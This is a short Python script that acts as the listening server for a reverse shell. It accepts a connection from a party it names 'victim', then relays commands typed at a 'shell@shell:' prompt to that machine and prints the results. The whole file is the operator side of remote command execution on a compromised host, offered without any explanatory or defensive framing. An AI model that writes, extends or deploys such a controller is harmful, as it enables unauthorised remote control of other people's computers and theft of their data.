import socket

def main():
    server = socket.socket()
    server.bind(('localhost', 7777))
    server.listen(1)

    while True:
        victim, direction = server.accept()
        print('New connection {}'.format(direction))

        view = victim.recv(1024)
        if view == '1':
            while True:
                option = raw_input("shell@shell: ")
                victim.send(option)
                result = victim.recv(2048)
                print(result)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()
    
    